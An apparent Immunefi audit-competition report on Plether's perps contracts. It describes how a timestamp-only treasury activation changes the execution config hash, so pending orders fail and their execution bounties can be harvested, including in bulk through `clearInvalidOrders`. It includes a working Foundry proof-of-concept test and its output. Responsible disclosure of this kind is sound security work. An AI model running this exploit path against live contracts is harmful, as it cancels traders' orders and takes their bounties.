# \#98155 [SC-Low] Timestamp-only treasury activation silently changes the execution config hash, so every pending pinned order fails terminally and its bounty goes to the keeper

**Submitted on Nov 5th 2026 at 15:06:17 UTC by @daivo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98155
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro

A queued treasury successor in `CfdTreasury` becomes active purely by timestamp, with no transaction and no event. `OrderLifecycleBook.currentExecutionConfigHash()` hashes the *effective* treasury address, and every V3 order pins `bounds.expectedConfigHash`. So at the activation second, every pending pinned order stops matching. When executed or cleared, each one fails terminally with `ConfigMismatch`, and its reserved execution bounty is paid to whoever executes or clears it. One permissionless call to `clearInvalidOrders` at the activation second collects the bounties of every pending open order of every trader. The traders' orders are never filled.

## Vulnerability Details

PR #130 added `CfdTreasury`. A successor becomes effective once `block.timestamp >= lockedUntil`, without any on-chain action:

```solidity
// CfdTreasury.sol#L101-L106
function _activeTreasury() internal view returns (TreasuryConfig storage active) {
    active = _currentTreasury;
    if (_pendingTreasury.account != address(0) && block.timestamp >= _currentTreasury.lockedUntil) {
        active = _pendingTreasury;      // no transaction, no event
    }
}
```

The documentation says this explicitly: *"Scheduled activation is resolved by timestamp and emits no automatic event."*

`currentExecutionConfigHash()` includes that timestamp-resolved value:

```solidity
// OrderLifecycleBook.sol#L172-L203
bytes memory engineConfig = abi.encode(
    engine.planner(), engine.settlementSidecar(), engine.terminalNavBook(), engineAdmin,
    IOrderLifecycleAdminConfigView(engineAdmin).activeConfigVersion(),
    engine.protocolTreasury(),          // <- changes at activation time with no tx
    IOrderLifecyclePoolConfigView(HOUSE_POOL).markStalenessLimit()
);
```

Every V3 order pins `bounds.expectedConfigHash`. At execution, the router checks the pinned hash before any oracle work. On a mismatch it marks the order terminally `ConfigMismatch` and pays the reserved execution bounty of a failed open to the executor.

All other config-hash inputs, such as `activeConfigVersion`, change only through an explicit finalize transaction that anyone can observe. The treasury input is the only one that changes with no transaction and no event. Traders, frontends and keepers therefore get no signal to react to.

The bounties can also be collected in bulk. `OrderRouter.clearInvalidOrders(uint64[])` is permissionless, needs no Pyth update or ETH, and works even behind a live queue head. It settles every config-invalid order, even one that has not expired, through `OrderRecoverySidecar.settleNonEngine → settleOrderFromSidecar(..., bountyRecipient = msg.sender)`.

None of the existing tests catch this: `TreasuryProposal.t.sol` and `TreasuryStateMachine.t.sol` never read `currentExecutionConfigHash()`.

## Impact Details

- Every trader whose order is pending at the activation second loses the order (the trade never executes). They also lose its execution bounty (up to `maxOpenOrderExecutionBountyAssets`: 0.2 USDG in the test config, minimum 1 USDG in the release config) to whoever executes or clears it.
- The activation time is public via `pendingProtocolTreasury()`. A keeper can wait for activation and collect the bounties of all pending opens instead of executing them.
- With `clearInvalidOrders`, one bot transaction at `block.timestamp == activation` collects every pending open bounty across all traders. In the PoC, 4 traders lose 0.8 USDG in one call.
- The treasury address has no effect on the trader's execution economics. Invalidating orders on it is a regression introduced by #130, not a protective check.

**Why Low:** only orders pending at the activation instant are affected (the execution window is 60 s). Each trader's loss is limited to that order's bounty. The trigger is a scheduled, non-malicious admin action (treasury rotation).

## References

- `_activeTreasury`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdTreasury.sol#L101-L106
- `proposeProtocolTreasury` / `pendingProtocolTreasury`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdTreasury.sol#L55-L100
- `currentExecutionConfigHash` (treasury input at L199): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderLifecycleBook.sol#L172-L203
- `clearInvalidOrders`: https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRouter.sol#L199-L204
- `OrderRecoverySidecar.sol` (`settleNonEngine`, bounty paid to `msg.sender`): https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/OrderRecoverySidecar.sol

### Recommendation

Use any one of these:

- Remove `engine.protocolTreasury()` from `currentExecutionConfigHash()`, since the treasury address does not affect the trader's execution economics.
- Or hash the treasury *schedule* (current + pending + activation time), which changes only on an explicit transaction, instead of the timestamp-resolved value.
- Or require an explicit `activatePendingTreasury()` transaction that bumps `activeConfigVersion` and emits an event, so the change can be observed.

---

## Proof of Concept

### Step-by-step

Only production entry points are used (`router.commitOrder(OrderRequest)`, `router.executeOrder`, `router.clearInvalidOrders`).

**Scenario A: single order, keeper executes**

1. The owner calls `setProtocolTreasury(A, 1 days)` and then `proposeProtocolTreasury(B, 0)`. This is the documented rotation flow.
2. 5 seconds before activation, a trader commits an ordinary open order pinned to the current `currentExecutionConfigHash()`. The order reserves an execution bounty.
3. Time passes the activation timestamp. No transaction runs, yet `protocolTreasury()` now returns B and `currentExecutionConfigHash()` has changed.
4. A keeper calls `router.executeOrder(id, pythUpdate)`. The result is `Failed / ConfigMismatch`. The keeper's clearinghouse balance goes up by the bounty, the trader's goes down by the bounty, and no position is opened.

**Scenario B: mass harvest**

1. Same treasury rotation setup as in Scenario A.
2. 30 seconds before activation, 4 different traders each commit an open order.
3. At `block.timestamp == activation`, all 4 orders are still inside their 60 s window. A bot calls `router.clearInvalidOrders(ids)`.
4. All 4 orders are cleared and the bot receives the sum of all 4 bounties.

### Foundry test

File: `packages/perps/test/perps/poc/L001_TreasuryActivationConfigHash.t.sol` (uses the existing `BasePerpTest` fixture)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {console2} from "forge-std/console2.sol";

contract L001_TreasuryActivationConfigHash is BasePerpTest {

    address internal constant TRADER = address(0xBEEF01);
    address internal constant KEEPER = address(0xBEEF02);
    address internal constant TREASURY_A = address(0xA0A0);
    address internal constant TREASURY_B = address(0xB0B0);

    function _openRequest(uint256 size, uint256 margin) internal view returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("L001", router.nextCommitId()));
        r.side = CfdTypes.Side.LONG;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = type(uint256).max;
        r.isClose = false;
        r.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(block.timestamp) + uint64(router.maxExecutionWindowSeconds()),
            executionWindowSeconds: uint32(router.maxExecutionWindowSeconds()),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function test_L001_scheduledTreasuryActivationFailsPendingOrdersAndPaysKeeper() public {
        engine.setProtocolTreasury(TREASURY_A, 1 days);
        uint256 activation = engine.protocolTreasuryLockedUntil();
        engine.proposeProtocolTreasury(TREASURY_B, 0);

        vm.warp(activation - 5);
        _fundTrader(TRADER, 10_000e6);
        bytes32 hashAtCommit = router.lifecycleBook().currentExecutionConfigHash();
        OrderV3Types.OrderRequest memory req = _openRequest(10_000e18, 1_000e6);
        vm.prank(TRADER);
        uint64 id = router.commitOrder(req);
        uint256 traderBalanceAfterCommit = clearinghouse.balanceAssets(TRADER);
        uint256 bounty = _executionBountyReserve(id);
        assertGt(bounty, 0, "open reserves a bounty");

        bytes[] memory update = _mockPythUpdateData(1e8);
        vm.warp(activation + 1);
        update = _mockPythUpdateData(1e8);
        assertEq(engine.protocolTreasury(), TREASURY_B, "successor active without a transaction");
        assertTrue(router.lifecycleBook().currentExecutionConfigHash() != hashAtCommit, "config hash moved");

        uint256 keeperBefore = clearinghouse.balanceAssets(KEEPER);
        vm.prank(KEEPER);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(id, update);

        console2.log("status", uint256(result.status));
        console2.log("terminalReason", uint256(result.terminalReason));
        console2.log("bounty paid to keeper", clearinghouse.balanceAssets(KEEPER) - keeperBefore);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Failed), "order terminally failed");
        assertEq(uint8(result.terminalReason), uint8(OrderV3Types.TerminalReason.ConfigMismatch), "ConfigMismatch");
        assertEq(clearinghouse.balanceAssets(KEEPER) - keeperBefore, bounty, "keeper receives trader's bounty");
        assertEq(traderBalanceAfterCommit - clearinghouse.balanceAssets(TRADER), bounty, "trader loses bounty");
        (uint256 size,,,,,,) = engine.positions(TRADER);
        assertEq(size, 0, "intended position never opened");
    }

    function test_L001_massHarvestViaClearInvalidOrders() public {
        engine.setProtocolTreasury(TREASURY_A, 1 days);
        uint256 activation = engine.protocolTreasuryLockedUntil();
        engine.proposeProtocolTreasury(TREASURY_B, 0);
        vm.warp(activation - 30);

        uint256 n = 4;
        uint64[] memory ids = new uint64[](n);
        uint256 totalBounty;
        for (uint256 i; i < n; ++i) {
            address trader = address(uint160(0xC0FFEE00 + i));
            _fundTrader(trader, 10_000e6);
            OrderV3Types.OrderRequest memory req = _openRequest(10_000e18, 1_000e6);
            vm.prank(trader);
            ids[i] = router.commitOrder(req);
            totalBounty += _executionBountyReserve(ids[i]);
        }

        vm.warp(activation); // successor active at exactly lockedUntil; orders are NOT expired (window 60 s)
        address bot = address(0xB07);
        uint256 before = clearinghouse.balanceAssets(bot);
        vm.prank(bot);
        (uint256 nextIndex, uint256 cleared) = router.clearInvalidOrders(ids);
        console2.log("cleared", cleared);
        console2.log("bot harvested", clearinghouse.balanceAssets(bot) - before);
        assertEq(nextIndex, n);
        assertEq(cleared, n, "every live, unexpired order cleared");
        assertEq(clearinghouse.balanceAssets(bot) - before, totalBounty, "all bounties paid to cleanup caller");
    }
}
```

### Run

```
forge test --root packages/perps --match-path 'test/perps/poc/L001*.t.sol' -vv
```

Output:

```
[PASS] test_L001_scheduledTreasuryActivationFailsPendingOrdersAndPaysKeeper()
Logs:
  status 3
  terminalReason 4
  bounty paid to keeper 200000

[PASS] test_L001_massHarvestViaClearInvalidOrders()
Logs:
  cleared 4
  bot harvested 800000
```

(`status 3` = `Failed`, `terminalReason 4` = `ConfigMismatch`, `200000` = 0.2 USDG.)

